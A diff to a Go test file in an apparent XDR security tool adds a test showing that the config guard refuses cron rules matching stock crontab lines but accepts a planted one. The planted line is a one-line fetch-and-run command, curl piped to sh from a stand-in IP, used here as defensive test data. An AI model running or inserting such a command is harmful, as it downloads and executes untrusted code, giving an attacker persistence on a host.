@@ -17,6 +17,7 @@ import (
 
 	clientv3 "go.etcd.io/etcd/client/v3"
 
+	"xdr/internal/baseline"
 	"xdr/internal/fleet"
 	"xdr/internal/fleettest"
 	"xdr/internal/hunt"
@@ -569,4 +570,30 @@ func TestHunt_CountsTowardFlood(t *testing.T) {
 		putHunt(t, f, "web01", fmt.Sprintf("cmd %d", i))
 	}
 	eventually(t, "host-disabled", func() bool { return len(kinds(r.seen(), "host-disabled")) == 1 })
+}
+
+// The controller knows the stock crontab lines from the baselines it
+// loads, so it refuses a cron rule naming one before any box must.
+func TestConfigGuard_StockCronFromBaselines(t *testing.T) {
+	p := filepath.Join(t.TempDir(), "triage.json.gz")
+	f, err := os.Create(p)
+	if err != nil {
+		t.Fatal(err)
+	}
+	b := &baseline.Baseline{Schema: 1, Files: map[string]baseline.FileEntry{
+		"/etc/crontab": {Type: baseline.TypeFile, SHA256: "aa", Content: []byte("17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")}}}
+	if err := baseline.Save(f, b); err != nil {
+		t.Fatal(err)
+	}
+	f.Close()
+	g, err := (&Config{Baselines: []string{p}}).Guard()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := g.Validate(rules.Rule{Kind: "cron", Command: "cd / && run-parts --report /etc/cron.hourly"}); err == nil || !strings.Contains(err.Error(), "stock cron") {
+		t.Fatalf("stock line: %v", err)
+	}
+	if err := g.Validate(rules.Rule{Kind: "cron", Command: "curl -s http://203.0.113.9/x | sh"}); err != nil {
+		t.Fatalf("planted line: %v", err)
+	}
 }
